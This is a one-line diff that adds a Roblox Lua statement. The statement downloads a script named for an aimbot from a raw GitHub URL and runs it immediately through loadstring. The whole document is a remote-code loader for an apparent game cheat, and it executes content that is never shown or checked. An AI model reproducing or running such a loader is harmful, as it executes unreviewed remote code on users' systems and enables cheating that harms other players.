@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RSOscrip/Aimbot/main/RSO_script"))()
